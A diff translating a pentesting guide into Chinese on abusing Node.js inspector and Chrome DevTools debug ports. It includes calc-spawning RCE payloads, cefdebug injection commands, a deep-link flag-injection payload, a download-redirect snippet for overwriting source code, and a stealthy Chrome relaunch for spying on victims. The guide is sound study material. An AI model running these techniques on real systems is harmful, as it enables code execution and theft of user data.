@@ -2,17 +2,16 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Basic Information
+## 基本信息
 
-[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): When started with the `--inspect` switch, a Node.js process listens for a debugging client. By **default**, it will listen at host and port **`127.0.0.1:9229`**. Each process is also assigned a **unique** **UUID**.
+[来自文档](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started)：当使用 `--inspect` 开关启动时，Node.js 进程会监听调试客户端。**默认情况下**，它将在主机和端口 **`127.0.0.1:9229`** 上监听。每个进程还会分配一个 **唯一** 的 **UUID**。
 
-Inspector clients must know and specify host address, port, and UUID to connect. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
+调试客户端必须知道并指定主机地址、端口和 UUID 以进行连接。完整的 URL 看起来像 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。
 
 > [!WARNING]
-> Since the **debugger has full access to the Node.js execution environment**, a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process (**potential privilege escalation**).
+> 由于 **调试器对 Node.js 执行环境具有完全访问权限**，能够连接到此端口的恶意行为者可能能够代表 Node.js 进程执行任意代码（**潜在的特权提升**）。
 
-There are several ways to start an inspector:
-
+启动调试器有几种方法：
 ```bash
 node --inspect app.js #Will run the inspector in port 9229
 node --inspect=4444 app.js #Will run the inspector in port 4444
@@ -23,58 +22,48 @@ node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and po
 node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 # Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
 ```
-
-When you start an inspected process something like this will appear:
-
+当你启动一个被检查的进程时，类似这样的内容将会出现：
 ```
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
+基于 **CEF** (**Chromium Embedded Framework**) 的进程需要使用参数: `--remote-debugging-port=9222` 来打开 **debugger**（SSRF 保护仍然非常相似）。然而，它们 **而不是** 授予 **NodeJS** **debug** 会话，而是使用 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 与浏览器进行通信，这是一个控制浏览器的接口，但没有直接的 RCE。
 
-Processes based on **CEF** (**Chromium Embedded Framework**) like need to use the param: `--remote-debugging-port=9222` to open de **debugger** (the SSRF protections remain very similar). However, they **instead** of granting a **NodeJS** **debug** session will communicate with the browser using the [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), this is an interface to control the browser, but there isn't a direct RCE.
-
-When you start a debugged browser something like this will appear:
-
+当你启动一个调试的浏览器时，类似这样的内容将会出现：
 ```
 DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
 ```
+### 浏览器、WebSockets 和同源政策 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
-
-Websites open in a web-browser can make WebSocket and HTTP requests under the browser security model. An **initial HTTP connection** is necessary to **obtain a unique debugger session id**. The **same-origin-policy** **prevents** websites from being able to make **this HTTP connection**. For additional security against [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifies that the **'Host' headers** for the connection either specify an **IP address** or **`localhost`** or **`localhost6`** precisely.
+在网页浏览器中打开的网站可以在浏览器安全模型下进行 WebSocket 和 HTTP 请求。**初始 HTTP 连接**是**获取唯一调试器会话 ID**所必需的。**同源政策****防止**网站能够进行**此 HTTP 连接**。为了防止 [**DNS 重新绑定攻击**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js 验证连接的**'Host' 头**是否精确指定了**IP 地址**或**`localhost`**或**`localhost6`**。
 
 > [!NOTE]
-> This **security measures prevents exploiting the inspector** to run code by **just sending a HTTP request** (which could be done exploiting a SSRF vuln).
+> 该**安全措施防止利用检查器**通过**仅发送 HTTP 请求**（这可以通过利用 SSRF 漏洞来完成）来运行代码。
 
-### Starting inspector in running processes
+### 在运行进程中启动检查器
 
-You can send the **signal SIGUSR1** to a running nodejs process to make it **start the inspector** in the default port. However, note that you need to have enough privileges, so this might grant you **privileged access to information inside the process** but no a direct privilege escalation.
-
+您可以向正在运行的 nodejs 进程发送**信号 SIGUSR1**以使其在默认端口**启动检查器**。但是，请注意，您需要拥有足够的权限，因此这可能会授予您**对进程内部信息的特权访问**，但不会直接导致权限提升。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
-
 > [!NOTE]
-> This is useful in containers because **shutting down the process and starting a new one** with `--inspect` is **not an option** because the **container** will be **killed** with the process.
+> 这在容器中很有用，因为 **关闭进程并启动一个新进程** 使用 `--inspect` **不是一个选项**，因为 **容器** 将与进程一起 **被终止**。
 
-### Connect to inspector/debugger
+### 连接到检查器/调试器
 
-To connect to a **Chromium-based browser**, the `chrome://inspect` or `edge://inspect` URLs can be accessed for Chrome or Edge, respectively. By clicking the Configure button, it should be ensured that the **target host and port** are correctly listed. The image shows a Remote Code Execution (RCE) example:
+要连接到 **基于Chromium的浏览器**，可以访问 Chrome 或 Edge 的 `chrome://inspect` 或 `edge://inspect` URL。通过点击配置按钮，应该确保 **目标主机和端口** 正确列出。图像显示了一个远程代码执行 (RCE) 示例：
 
 ![](<../../images/image (674).png>)
 
-Using the **command line** you can connect to a debugger/inspector with:
-
+使用 **命令行**，您可以通过以下方式连接到调试器/检查器：
 ```bash
 node inspect <ip>:<port>
 node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-
-The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), allows to **find inspectors** running locally and **inject code** into them.
-
+该工具 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) 允许 **查找** 本地运行的检查器并 **注入代码**。
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -83,76 +72,67 @@ The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefd
 #Exploit it
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
+> [!NOTE]
+> 请注意，**NodeJS RCE 漏洞将无法工作**，如果通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 连接到浏览器（您需要检查 API 以找到有趣的事情来做）。
+
+## NodeJS 调试器/检查器中的 RCE
 
 > [!NOTE]
-> Note that **NodeJS RCE exploits won't work** if connected to a browser via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (you need to check the API to find interesting things to do with it).
+> 如果您来这里是想了解如何从 Electron 中的 [**XSS 获取 RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
 
-## RCE in NodeJS Debugger/Inspector
-
-> [!NOTE]
-> If you came here looking how to get [**RCE from a XSS in Electron please check this page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
-
-Some common ways to obtain **RCE** when you can **connect** to a Node **inspector** is using something like (looks that this **won't work in a connection to Chrome DevTools protocol**):
-
+一些常见的方法来获得 **RCE** 当您可以 **连接** 到 Node **检查器** 时是使用类似的东西（看起来这 **在连接到 Chrome DevTools 协议时将无法工作**）：
 ```javascript
 process.mainModule.require("child_process").exec("calc")
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
 require("child_process").spawnSync("calc.exe")
 Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
 ```
-
 ## Chrome DevTools Protocol Payloads
 
-You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
-In this section I will just list interesting things I find people have used to exploit this protocol.
+您可以在此处查看 API: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
+在本节中，我将列出我发现人们用来利用此协议的有趣内容。
 
-### Parameter Injection via Deep Links
+### 通过深层链接进行参数注入
 
-In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security discovered that an application based on CEF **registered a custom UR**I in the system (workspaces://) that received the full URI and then **launched the CEF based applicatio**n with a configuration that was partially constructing from that URI.
+在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino 安全发现基于 CEF 的应用程序 **在系统中注册了一个自定义 URI** (workspaces://)，该 URI 接收完整的 URI，然后 **使用部分构造的配置启动 CEF 基于的应用程序**。
 
-It was discovered that the URI parameters where URL decoded and used to launch the CEF basic application, allowing a user to **inject** the flag **`--gpu-launcher`** in the **command line** and execute arbitrary things.
+发现 URI 参数被 URL 解码并用于启动 CEF 基本应用程序，允许用户在 **命令行** 中 **注入** 标志 **`--gpu-launcher`** 并执行任意操作。
 
-So, a payload like:
-
+因此，像这样的有效载荷:
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
+将执行 calc.exe。
 
-Will execute a calc.exe.
+### 覆盖文件
 
-### Overwrite Files
-
-Change the folder where **downloaded files are going to be saved** and download a file to **overwrite** frequently used **source code** of the application with your **malicious code**.
-
+更改 **下载文件将要保存的文件夹**，并下载一个文件以 **覆盖** 应用程序中常用的 **源代码**，用你的 **恶意代码** 替换。
 ```javascript
 ws = new WebSocket(url) //URL of the chrome devtools service
 ws.send(
-  JSON.stringify({
-    id: 42069,
-    method: "Browser.setDownloadBehavior",
-    params: {
-      behavior: "allow",
-      downloadPath: "/code/",
-    },
-  })
+JSON.stringify({
+id: 42069,
+method: "Browser.setDownloadBehavior",
+params: {
+behavior: "allow",
+downloadPath: "/code/",
+},
+})
 )
 ```
+### Webdriver RCE 和外泄
 
-### Webdriver RCE and exfiltration
+根据这篇文章：[https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)，可以获得 RCE 并从 theriver 中外泄内部页面。
 
-According to this post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) it's possible to obtain RCE and exfiltrate internal pages from theriver.
+### 后期利用
 
-### Post-Exploitation
+在真实环境中，**在攻陷**使用 Chrome/Chromium 浏览器的用户 PC 后，您可以启动一个 Chrome 进程，**激活调试并转发调试端口**，以便您可以访问它。这样，您将能够**检查受害者在 Chrome 中所做的一切并窃取敏感信息**。
 
-In a real environment and **after compromising** a user PC that uses Chrome/Chromium based browser you could launch a Chrome process with the **debugging activated and port-forward the debugging port** so you can access it. This way you will be able to **inspect everything the victim does with Chrome and steal sensitive information**.
-
-The stealth way is to **terminate every Chrome process** and then call something like
-
+隐秘的方法是**终止每个 Chrome 进程**，然后调用类似于
 ```bash
 Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 ```
-
-## References
+## 参考文献
 
 - [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
 - [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
